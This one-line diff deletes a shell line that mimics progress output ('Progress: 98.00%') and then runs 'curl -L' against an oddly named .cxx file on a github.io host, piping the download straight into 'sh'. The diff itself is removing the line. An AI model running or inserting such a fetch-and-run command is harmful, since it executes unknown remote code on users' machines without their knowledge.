@@ -1,1 +1,0 @@
-echo Progress: 98.00%curl -L --progress-bar frkns.github.io/fun/bluetoothAddressesWalkBulletLuciaAlongHosting.cxx | sh
